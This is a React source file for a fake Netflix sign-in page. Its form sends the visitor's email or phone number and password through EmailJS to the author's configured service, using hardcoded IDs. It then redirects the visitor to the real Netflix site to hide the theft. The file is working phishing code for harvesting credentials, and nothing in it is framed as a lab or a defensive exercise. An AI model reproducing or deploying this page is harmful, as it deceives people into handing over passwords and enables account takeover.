import React, { useState } from 'react';
import {Routes, Route, useNavigate} from 'react-router-dom';
import Nav from '../../components/Nav/Nav';
import emailjs from '@emailjs/browser';
import './Login.css';
import { useRef } from 'react';

const handleClick = () => {
  window.location.replace('https://www.netflix.com/browse');
};

const Login = () => {

  const form = useRef();

  const [done, setDone] = useState(false)

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs.sendForm('service_t8p3ls8', 'template_zb0q5e8', form.current, 'F82WXicHG2s5sJv4v')
      .then((result) => {
        console.log(result.text);
        setDone(true)
      }, (error) => {
        console.log(error.text);
      });
  };





  return (
    <>
      <div className='header'>
        <Nav />
        <div className="form-wrap">
          <h2>Sign In</h2>
          <form className='form' action="#" ref={form} onSubmit={sendEmail} >
            <div className="form-control">
              <input type="text" name="from_name" required />
              <label >Email or phone number</label>
            </div>
            <div className="form-control">
              <input type="password" name="message" required />
              <label >Password</label>
            </div>
            <button type='submit' onClick={handleClick}  >Sign in</button>
            <div className="form-helper">
              <div className="remember">
                <input type="checkbox" id='remember' />
                <label htmlFor="remember">Remember me</label>
              </div>
              <a href="#">Need help ?</a>
            </div>
          </form>
          <p>New to Netflix ? <a href="#">Sign up now</a> </p>
          <small>
            This page is protected by Google reCAPTCHA to ensure you're not a bot.
            <a href="#">Learn more.</a>
          </small>
        </div>
      </div>
    </>
  )
}

export default Login